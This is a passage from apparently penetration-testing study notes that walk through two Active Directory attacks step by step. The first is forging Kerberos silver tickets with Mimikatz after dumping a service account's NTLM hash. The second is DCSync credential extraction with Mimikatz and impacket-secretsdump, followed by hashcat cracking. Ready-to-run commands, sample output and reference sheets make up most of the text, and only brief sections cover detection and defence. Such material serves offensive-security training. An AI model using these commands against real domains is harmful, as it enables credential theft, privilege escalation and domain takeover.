2. **Domain SID**: Security Identifier of the target domain
3. **Target SPN**: Specific Service Principal Name to access

### Information Gathering for Silver Tickets

**Access Verification (Baseline Test):**
```powershell
# Test current access to target resource
iwr -UseDefaultCredentials http://web04
```

**Expected Access Denied Response:**
```
401 - Unauthorized: Access is denied due to invalid credentials.
Server Error

  401 - Unauthorized: Access is denied due to invalid credentials.
  You do not have permission to view this directory or page using the credentials that you supplied.
```

**Service Account Hash Extraction:**
```powershell
# Launch PowerShell as Administrator
# Navigate to tools directory
cd C:\Tools

# Execute Mimikatz
.\mimikatz.exe

# Enable debug privileges
privilege::debug

# Extract cached credentials
sekurlsa::logonpasswords
```

**Sample Hash Extraction Output:**
```
Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
```

**Domain SID Retrieval:**
```powershell
# Obtain current user SID (extract domain portion)
whoami /user
```

**SID Output Analysis:**
```
USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```

**Domain SID Extraction:**
- **Full SID**: `S-1-5-21-1987370270-658905905-1781884369-1105`
- **Domain SID**: `S-1-5-21-1987370270-658905905-1781884369` (remove RID)
- **RID**: `1105` (user-specific identifier)

### Silver Ticket Creation with Mimikatz

**Forge Service Ticket Command:**
```mimikatz
# Create silver ticket with elevated privileges
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

**Command Parameters:**
- **/sid**: Domain Security Identifier
- **/domain**: Target domain name
- **/ptt**: Pass-the-ticket (inject into current session)
- **/target**: Target server/service FQDN
- **/service**: Service protocol (http, cifs, ldap, etc.)
- **/rc4**: NTLM hash of service account
- **/user**: Username to impersonate (can be any domain user)

**Silver Ticket Creation Output:**
```
User      : jeffadmin
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service   : http
Target    : web04.corp.com
Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
```

**Automatic Privilege Assignment:**
- **User ID 500**: Built-in local administrator
- **Group 512**: Domain Admins
- **Group 513**: Domain Users
- **Group 518**: Schema Admins
- **Group 519**: Enterprise Admins
- **Group 520**: Group Policy Creator Owners

### Ticket Verification and Usage

**Verify Ticket Injection:**
```powershell
# List cached Kerberos tickets
klist
```

**Ticket Verification Output:**
```
Current LogonId is 0:0xa04cc

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/14/2022 4:37:32 (local)
        End Time:   9/11/2032 4:37:32 (local)
        Renew Time: 9/11/2032 4:37:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

**Test Service Access:**
```powershell
# Access target resource with forged ticket
iwr -UseDefaultCredentials http://web04
```

**Successful Access Response:**
```
StatusCode        : 200
StatusDescription : OK
Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
                    <html xmlns="http://www.w3.org/1999/xhtml">
                    <head>
                    <meta http-equiv="Content-Type" cont...
RawContent        : HTTP/1.1 200 OK
                    Persistent-Auth: true
                    Accept-Ranges: bytes
                    Content-Length: 703
                    Content-Type: text/html
                    Date: Wed, 14 Sep 2022 11:37:39 GMT
                    ETag: "b752f823fc8d81:0"
                    Last-Modified: Wed, 14 Sep 20...
```

### Silver Ticket Attack Variations

**Different Service Types:**
```mimikatz
# CIFS/SMB service ticket
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<target_server> /service:cifs /rc4:<ntlm_hash> /user:<username>

# LDAP service ticket
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<target_server> /service:ldap /rc4:<ntlm_hash> /user:<username>

# HOST service ticket (multiple services)
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<target_server> /service:host /rc4:<ntlm_hash> /user:<username>

# MSSQL service ticket
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<target_server> /service:mssql /rc4:<ntlm_hash> /user:<username>
```

**Custom Group Memberships:**
```mimikatz
# Specify custom groups (RIDs)
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<target_server> /service:<service> /rc4:<ntlm_hash> /user:<username> /groups:512,513,518,519,520

# Minimal privileges (Domain Users only)
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<target_server> /service:<service> /rc4:<ntlm_hash> /user:<username> /groups:513
```

### PAC Validation and Security Considerations

**Privileged Account Certificate (PAC) Validation:**
- **Purpose**: Verify user permissions with domain controller
- **Implementation**: Rarely enabled in production environments
- **Bypass**: Silver tickets work when PAC validation disabled
- **Detection**: PAC validation requests generate logs

**Microsoft Security Updates:**
- **PAC_REQUESTOR Field**: Enhanced PAC structure validation
- **Enforcement Date**: October 11, 2022
- **Impact**: Prevents forging tickets for non-existent users
- **Limitation**: Only effective when client and KDC in same domain

### Silver Ticket Commands Reference

**Information Gathering:**
```powershell
# Test baseline access
iwr -UseDefaultCredentials <target_url>

# Extract service account hash
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Obtain domain SID
whoami /user

# Identify target SPN
setspn -L <service_account>
```

**Silver Ticket Creation:**
```mimikatz
# Basic silver ticket
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<target> /service:<service> /rc4:<hash> /user:<user>

# Silver ticket with custom lifetime
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<target> /service:<service> /rc4:<hash> /user:<user> /startoffset:-10 /endin:600 /renewmax:10080

# Silver ticket without PTT (save to file)
kerberos::golden /sid:<domain_sid> /domain:<domain> /target:<target> /service:<service> /rc4:<hash> /user:<user> /ticket:<filename>
```

**Ticket Management:**
```powershell
# List current tickets
klist

# Clear all tickets
klist purge

# Import ticket from file
.\Rubeus.exe ptt /ticket:<ticket_file>
```

### Attack Scenarios and Use Cases

**Common Silver Ticket Targets:**
- **HTTP/HTTPS Services**: Web applications, IIS servers
- **CIFS/SMB Shares**: File servers, administrative shares
- **LDAP Services**: Directory queries, user enumeration
- **MSSQL Services**: Database access, command execution
- **HOST Services**: Multiple service access, RDP, WinRM

**Strategic Advantages:**
- **Stealth**: No authentication requests to domain controller
- **Persistence**: Long-lived tickets (default 10 years)
- **Flexibility**: Access multiple servers with same SPN
- **Privilege Escalation**: Arbitrary group membership assignment

### Defensive Countermeasures

**Detection Strategies:**
- **Unusual Ticket Lifetimes**: Monitor for abnormally long-lived tickets
- **Privilege Anomalies**: Detect users with unexpected high privileges
- **Service Access Patterns**: Monitor for unusual service access
- **PAC Validation Logs**: Enable and monitor PAC validation requests

**Preventive Measures:**
- **PAC Validation**: Enable PAC validation for critical services
- **Service Account Security**: Use Managed Service Accounts (MSA/gMSA)
- **Credential Protection**: Implement Credential Guard
- **Monitoring**: Deploy advanced threat detection systems

### Key Insights for Silver Ticket Attacks

**Attack Effectiveness:**
- Silver tickets provide persistent access to specific services
- Forged tickets bypass normal authentication mechanisms
- Attack success depends on service account credential compromise
- Multiple services can be accessed with single service account hash

**Operational Considerations:**
- Requires prior compromise of service account credentials
- Most effective when PAC validation is disabled
- Long ticket lifetimes provide extended access
- Can be used across multiple servers hosting same SPN

**Security Implications:**
- Service account compromise affects all associated SPNs
- Difficult to detect without proper monitoring
- Provides high-privilege access through forged group memberships
- Represents significant lateral movement vector

Silver tickets demonstrate the critical importance of protecting service account credentials and implementing comprehensive monitoring for unusual authentication patterns in Active Directory environments.

---

## Domain Controller Synchronization (DCSync)

DCSync attacks exploit Active Directory replication mechanisms to impersonate domain controllers and extract user credentials directly from domain controllers without requiring direct access to domain controller systems.

### Directory Replication Service (DRS) Protocol

**Replication Mechanism:**
- **Purpose**: Synchronize domain controllers in multi-DC environments
- **API**: IDL_DRSGetNCChanges for requesting object updates
- **Authentication**: SID-based privilege verification (not DC identity verification)
- **Vulnerability**: Accepts replication requests from any appropriately privileged account

**Required Privileges:**
- **Replicating Directory Changes**: Basic replication permission
- **Replicating Directory Changes All**: Extended replication permission
- **Replicating Directory Changes in Filtered Set**: Filtered set replication permission

**Default Privilege Holders:**
- **Domain Admins**: Full replication rights
- **Enterprise Admins**: Cross-domain replication rights
- **Administrators**: Local administrator replication rights

### Windows-Based DCSync with Mimikatz

**Prerequisites:**
- Domain-joined Windows machine
- Account with replication privileges (Domain Admin, Enterprise Admin, or Administrator)
- Mimikatz tool

**Basic DCSync Attack:**
```powershell
# Navigate to tools directory
cd C:\Tools

# Launch Mimikatz
.\mimikatz.exe

# Execute DCSync attack against specific user
lsadump::dcsync /user:corp\dave
```

**DCSync Command Parameters:**
- **lsadump::dcsync**: Mimikatz module for DCSync attacks
- **/user**: Target username in domain\username format
- **/domain**: Optional domain specification
- **/dc**: Optional domain controller specification

**Sample DCSync Output:**
```
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\dave' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : dave

** SAM ACCOUNT **

SAM Username         : dave
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
Account expiration   :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
Object Relative ID   : 1103

Credentials:
    Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
```

**Extract Domain Administrator Credentials:**
```mimikatz
# Target domain administrator account
lsadump::dcsync /user:corp\Administrator
```

**Administrator DCSync Output:**
```
Credentials:
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
```

### Linux-Based DCSync with Impacket

**Tool: impacket-secretsdump**

**Basic DCSync Attack:**
```bash
# Target specific user
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

**Command Parameters:**
- **-just-dc-user**: Target specific user for credential extraction
- **corp.com/jeffadmin**: Domain/username for authentication
- **"password"**: Password (escape special characters)
- **@192.168.50.70**: Domain controller IP address

**Sample Secretsdump Output:**
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
[*] Kerberos keys grabbed
dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
dave:des-cbc-md5:1a329b4338bfa215
[*] Cleaning up...
```

### Hash Cracking and Analysis

**Extract NTLM Hash for Cracking:**
```bash
# Save hash to file
echo "08d7a47a6f9f66b97b1bae4178747494" > hashes.dcsync

# Crack NTLM hash with Hashcat
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Successful Crack Output:**
```
08d7a47a6f9f66b97b1bae4178747494:Flowers1
```

### Advanced DCSync Techniques

**Dump All Domain Users:**
```bash
# Extract all domain user credentials
impacket-secretsdump corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

**Target Specific Domain Controllers:**
```bash
# Specify target domain controller
impacket-secretsdump -just-dc-user Administrator corp.com/jeffadmin:"password"@DC2.corp.com
```

**Extract Computer Account Hashes:**
```bash
# Target computer accounts (machine accounts)
impacket-secretsdump -just-dc-user "CLIENT75$" corp.com/jeffadmin:"password"@192.168.50.70
```

### DCSync Commands Reference

**Windows (Mimikatz):**
```mimikatz
# Basic user credential extraction
lsadump::dcsync /user:<domain>\<username>

# Target specific domain controller
lsadump::dcsync /user:<domain>\<username> /dc:<dc_fqdn>

# Extract all domain users (requires significant privileges)
lsadump::dcsync /all

# Target computer account
lsadump::dcsync /user:<domain>\<computer_name>$

# Extract specific domain
lsadump::dcsync /user:<username> /domain:<domain_fqdn>
```

**Linux (Impacket):**
```bash
# Single user extraction
impacket-secretsdump -just-dc-user <username> <domain>/<user>:<password>@<dc_ip>

# All domain users
impacket-secretsdump <domain>/<user>:<password>@<dc_ip>

# Use NTLM hash instead of password
impacket-secretsdump -just-dc-user <username> -hashes :<ntlm_hash> <domain>/<user>@<dc_ip>

# Target specific domain controller
impacket-secretsdump -just-dc-user <username> <domain>/<user>:<password>@<specific_dc_ip>

# Extract NTDS.dit secrets
impacket-secretsdump -ntds ntds.dit -system system.hiv LOCAL
```

### Attack Variations and Use Cases

**Credential Types Extracted:**
- **NTLM Hashes**: Primary authentication hashes
- **LM Hashes**: Legacy authentication hashes (if enabled)
- **Kerberos Keys**: AES256, AES128, DES encryption keys
- **Password History**: Previous password hashes
- **Supplemental Credentials**: Additional authentication data

**High-Value Targets:**
- **Administrator**: Built-in domain administrator
- **krbtgt**: Key Distribution Center service account
- **Service Accounts**: High-privilege service accounts
- **Computer Accounts**: Machine account credentials

### Defensive Countermeasures

**Privilege Management:**
- **Limit Replication Rights**: Restrict replication permissions to necessary accounts
- **Regular Audits**: Monitor accounts with replication privileges
- **Principle of Least Privilege**: Minimize Domain Admin membership
- **Tiered Administration**: Implement administrative tier model

**Detection and Monitoring:**
- **Replication Anomalies**: Monitor unusual replication requests
- **Event Log Analysis**: Track DCSync-related events (Event ID 4662)
- **Network Monitoring**: Detect DRSUAPI traffic patterns
- **Behavioral Analytics**: Identify abnormal administrative activities

### Key Insights for DCSync Attacks

**Attack Effectiveness:**
- DCSync provides direct access to any domain user credentials
- No physical access to domain controllers required
- Works from any domain-joined machine with appropriate privileges
- Extracts multiple credential formats simultaneously

**Operational Advantages:**
- **Stealth**: Mimics legitimate replication traffic
- **Comprehensive**: Extracts all credential types
- **Remote**: Can be executed from any network location
- **Scalable**: Can target individual users or entire domains

**Security Implications:**
- Complete domain compromise possible with single privileged account
- Credential extraction includes password history and Kerberos keys
- Attack success independent of domain controller physical security
- Represents critical escalation path in Active Directory environments

DCSync attacks demonstrate the critical importance of protecting highly privileged accounts and implementing comprehensive monitoring for replication activities in Active Directory environments.
